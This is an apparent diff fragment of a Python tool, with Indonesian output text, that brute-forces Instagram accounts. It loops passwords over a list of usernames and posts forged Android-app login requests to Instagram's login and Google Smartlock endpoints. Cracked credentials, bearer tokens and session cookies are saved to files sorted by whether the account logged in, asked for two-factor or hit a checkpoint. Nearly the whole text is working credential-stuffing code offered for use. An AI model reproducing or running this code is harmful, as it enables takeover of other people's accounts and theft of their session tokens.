+        Console().print(f'\n [bold green]#[bold white] Response selesai\n\n [bold green]-[bold white] Result Ok : [bold green]{self.success}\n [bold green]-[bold white] Result Cp : [bold yellow]{self.chekpoint}\n [bold green]•[bold white] Result 2f : [bold red]{self.faktor}\n\n [bold white] - Thanks To Zoraa Dev -')
         
-        if missing_modules:
-            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
-            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
-            sys.exit(1)
+    def Exec_Threads(self, username, password):
+        byps = requests.Session()
+        Console().print(f" [bold purple]• [bold white]threads [bold green]{str(username)[:15]} [bold white][{str(len(dump))}/{self.looping}] - Ok/[bold green]{self.success}[bold white] - 2f/[bold red]{self.faktor}[bold white] - Cp/[bold yellow]{self.chekpoint}[bold white]]     ", end='\r')
+        useragent = Useragent().useragent_instagram()
+        for passwd in password:
+            try:
+                self.hash = hashlib.md5()
+                self.hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
+                self.hex = self.hash.hexdigest()
+                self.hash.update(self.hex.encode('utf-8') + '12345'.encode('utf-8')) 
+                headers = {
+                    'host': 'i.instagram.com',
+                    'x-ig-app-locale': 'in_ID',
+                    'x-ig-device-locale': 'in_ID',
+                    'x-ig-mapped-locale': 'id_ID',
+                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
+                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+                    'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
+                    'x-ig-www-claim': '0',
+                    'x-bloks-is-prism-enabled': 'false',
+                    'x-bloks-is-layout-rtl': 'false',
+                    'x-ig-device-id': str(uuid.uuid4()),
+                    'x-ig-family-device-id': str(uuid.uuid4()),
+                    'x-ig-android-id': f'android-{self.hash.hexdigest()[:16]}',
+                    'x-fb-connection-type': 'MOBILE.LTE',
+                    'x-ig-connection-type': 'MOBILE(LTE)',
+                    'x-ig-capabilities': '3brTv10=',
+                    'priority': 'u=3',
+                    'user-agent': useragent,
+                    'accept-language': 'id-ID, en-US',
+                    'x-mid': '',
+                    'ig-intended-user-id': '0',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'x-fb-http-engine': 'Liger',
+                    'x-fb-client-ip': 'True',
+                    'x-fb-server-cluster': 'True',
+                    'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
+                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
+                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
+                    'x-ig-app-id': '3419628305025917',
+                    'x-pigeon-rawclienttime': str(round(time.time(), 3)),
+                    'connection': 'keep-alive'
+                }
+                encode = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(time.time)[:10]}%3A{urllib.request.quote(str(passwd))}%22%2C%22family_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{{str(uuid.uuid4())}}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49')
+                headers.update({'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])})
+                response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, headers = headers, allow_redirects=True).text
+                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
+                if 'logged_in_user' in str(response):
+                    self.success+=1
+                    try:
+                        self.ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1)
+                        self.decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(self.ig_set_autorization.split('Bearer IGT:2:')[1]))
+                    except (Exception) as e: pass
+                    try:
+                        cookies = (';'.join(['%s=%s'%(name, value) for name, value in self.decode_ig_set_authorization.items()]))
+                    except (Exception) as e: cookies = ('cookies tidak di temukan')
+                    try: follower, followed, feedpost = Require().Validasi_Username(username)
+                    except (UnboundLocalError) as e: pass
+                    tree = Tree('\r[italic green]Success logged    ')
+                    tree.add(f'[italic white]Username : [italic green]{username}')
+                    tree.add(f'[italic white]Password : [italic green]{passwd}')
+                    tree.add(f'[italic white]Profile Acc : [italic green]{follower}[bold white]/[italic green]{followed}[bold white]/[italic green]{feedpost}')
+                    true = tree.add('[italic green]Response Cookies')
+                    true.add(f'[italic white]Cookies : [italic green]{cookies}')
+                    true.add(f'[italic white]Bearers : [italic green]{self.ig_set_autorization}')
+                    tree.add(f'[italic white]Useragent : [italic green]{headers["user-agent"]}')
+                    printz(tree)
+                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookies}|{self.ig_set_autorization}\n'
+                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
+                        wr.write(save)
+                        wr.close()
+                    break          
+                elif 'two_factor_required' in str(response):
+                    try: follower, followed, feedpost = Require().Validasi_Username(username)
+                    except (UnboundLocalError) as e: pass
+                    tree = Tree('\r[italic red]logged 2FA    ')
+                    tree.add(f'[italic white]Username : [italic red]{username}')
+                    tree.add(f'[italic white]Password : [italic red]{passwd}')
+                    tree.add(f'[italic white]Profile Acc : [italic red]{follower}[bold white]/[italic red]{followed}[bold white]/[italic yellow]{feedpost}')
+                    tree.add(f'[italic white]Useragent : [italic red]{headers["user-agent"]}')
+                    printz(tree)
+                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
+                    self.faktor+=1
+                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
+                        wr.write(save)
+                        wr.close()   
+                    break 
+                elif 'challenge_required' in str(response):
+                    try: follower, followed, feedpost = Require().Validasi_Username(username)
+                    except (UnboundLocalError) as e: pass
+                    tree = Tree('\r[italic yellow]logged chekpoint    ')
+                    tree.add(f'[italic white]Username : [italic yellow]{username}')
+                    tree.add(f'[italic white]Password : [italic yellow]{passwd}')
+                    tree.add(f'[italic white]Profile Acc : [italic yellow]{follower}[bold white]/[italic yellow]{followed}[bold white]/[italic yellow]{feedpost}')
+                    tree.add(f'[italic white]Useragent : [italic yellow]{headers["user-agent"]}')
+                    printz(tree)
+                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
+                    self.chekpoint+=1
+                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
+                        wr.write(save)
+                        wr.close()
+                    break    
+                else: continue   
+            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
+                time.sleep(31)
+        self.looping+=1
         
-        # Start the main menu
-        menu()
+    def Exec_Smartlock(self, username, password):
+        byps = requests.Session()
+        Console().print(f" [bold purple]• [bold white]threads [bold green]{str(username)[:15]} [bold white][{str(len(dump))}/{self.looping}] - Ok/[bold green]{self.success}[bold white] - 2f/[bold red]{self.faktor}[bold white] - Cp/[bold yellow]{self.chekpoint}[bold white]]     ", end='\r')
+        useragent = Useragent().useragent_instagram()
+        for passwd in password:
+            try:
+                self.hash = hashlib.md5()
+                self.hash.update(username.encode('utf-8') + passwd.encode('utf-8'))
+                self.hex = self.hash.hexdigest()
+                self.hash.update(self.hex.encode('utf-8') + '12345'.encode('utf-8')) 
+                headers = {
+                    'host': 'i.instagram.com',
+                    'x-ig-app-locale': 'in_ID',
+                    'x-ig-device-locale': 'in_ID',
+                    'x-ig-mapped-locale': 'id_ID',
+                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
+                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
+                    'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
+                    'x-ig-www-claim': '0',
+                    'x-bloks-is-prism-enabled': 'false',
+                    'x-bloks-is-layout-rtl': 'false',
+                    'x-ig-device-id': str(uuid.uuid4()),
+                    'x-ig-family-device-id': str(uuid.uuid4()),
+                    'x-ig-android-id': f'android-{self.hash.hexdigest()[:16]}',
+                    'x-fb-connection-type': 'MOBILE.LTE',
+                    'x-ig-connection-type': 'MOBILE(LTE)',
+                    'x-ig-capabilities': '3brTv10=',
+                    'priority': 'u=3',
+                    'user-agent': useragent,
+                    'accept-language': 'id-ID, en-US',
+                    'x-mid': '',
+                    'ig-intended-user-id': '0',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'x-fb-http-engine': 'Liger',
+                    'x-fb-client-ip': 'True',
+                    'x-fb-server-cluster': 'True',
+                    'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
+                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
+                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
+                    'x-ig-app-id': '3419628305025917',
+                    'x-pigeon-rawclienttime': str(round(time.time(), 3)),
+                    'connection': 'keep-alive'
+                }
+                payload = {'params': '{"client_input_params":{"device_id":"'+ str(headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(username)+'","machine_id":"'+str(headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(username)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(passwd)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(headers['x-ig-family-device-id'])+'","device_id":"'+str(headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}','bk_client_context': '{"bloks_version":"'+ str(headers['x-bloks-version-id']) +'","styles_id":"instagram"}','bloks_versioning_id': str(headers['x-bloks-version-id'])}
+                encode = ('params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(payload['params']), urllib.parse.quote(payload['bk_client_context']), payload['bloks_versioning_id']))
+                headers.update({'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])})
+                response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data = encode, headers = headers, allow_redirects=True).text
+                self.result_ok, self.result_two, self.result_cp = self.Simpan_Result()
+                if 'logged_in_user' in str(response):
+                    self.success+=1
+                    try:
+                        self.ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1)
+                        self.decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(self.ig_set_autorization.split('Bearer IGT:2:')[1]))
+                    except (Exception) as e: pass
+                    try:
+                        cookies = (';'.join(['%s=%s'%(name, value) for name, value in self.decode_ig_set_authorization.items()]))
+                    except (Exception) as e: cookies = ('cookies tidak di temukan')
+                    try: follower, followed, feedpost = Require().Validasi_Username(username)
+                    except (UnboundLocalError) as e: pass
+                    tree = Tree('\r[italic green]Success logged    ')
+                    tree.add(f'[italic white]Username : [italic green]{username}')
+                    tree.add(f'[italic white]Password : [italic green]{passwd}')
+                    tree.add(f'[italic white]Profile Acc : [italic green]{follower}[bold white]/[italic green]{followed}[bold white]/[italic green]{feedpost}')
+                    true = tree.add('[italic green]Response Cookies')
+                    true.add(f'[italic white]Cookies : [italic green]{cookies}')
+                    true.add(f'[italic white]Bearers : [italic green]{self.ig_set_autorization}')
+                    tree.add(f'[italic white]Useragent : [italic green]{headers["user-agent"]}')
+                    printz(tree)
+                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookies}|{self.ig_set_autorization}\n'
+                    with open('/sdcard/OK/'+self.result_ok,'a') as wr:
+                        wr.write(save)
+                        wr.close()
+                    break          
+                elif 'two_factor_required' in str(response):
+                    try: follower, followed, feedpost = Require().Validasi_Username(username)
+                    except (UnboundLocalError) as e: pass
+                    tree = Tree('\r[italic red]logged 2FA    ')
+                    tree.add(f'[italic white]Username : [italic red]{username}')
+                    tree.add(f'[italic white]Password : [italic red]{passwd}')
+                    tree.add(f'[italic white]Profile Acc : [italic red]{follower}[bold white]/[italic red]{followed}[bold white]/[italic yellow]{feedpost}')
+                    tree.add(f'[italic white]Useragent : [italic red]{headers["user-agent"]}')
+                    printz(tree)
+                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
+                    self.faktor+=1
+                    with open('/sdcard/2F/'+self.result_two,'a') as wr:
+                        wr.write(save)
+                        wr.close()   
+                    break 
+                elif 'challenge_required' in str(response):
+                    try: follower, followed, feedpost = Require().Validasi_Username(username)
+                    except (UnboundLocalError) as e: pass
+                    tree = Tree('\r[italic yellow]logged chekpoint    ')
+                    tree.add(f'[italic white]Username : [italic yellow]{username}')
+                    tree.add(f'[italic white]Password : [italic yellow]{passwd}')
+                    tree.add(f'[italic white]Profile Acc : [italic yellow]{follower}[bold white]/[italic yellow]{followed}[bold white]/[italic yellow]{feedpost}')
+                    tree.add(f'[italic white]Useragent : [italic yellow]{headers["user-agent"]}')
+                    printz(tree)
+                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
+                    self.chekpoint+=1
+                    with open('/sdcard/CP/'+self.result_cp,'a') as wr:
+                        wr.write(save)
+                        wr.close()
+                    break    
+                else: continue   
+            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
+                time.sleep(31)
+        self.looping+=1
         
-    except KeyboardInterrupt:
-        clear()
-        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
-        sys.exit(0)
-    except Exception as e:
-        clear()
-        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
-        sys.exit(1)
+Instagram().Chek_Cookies()
+                
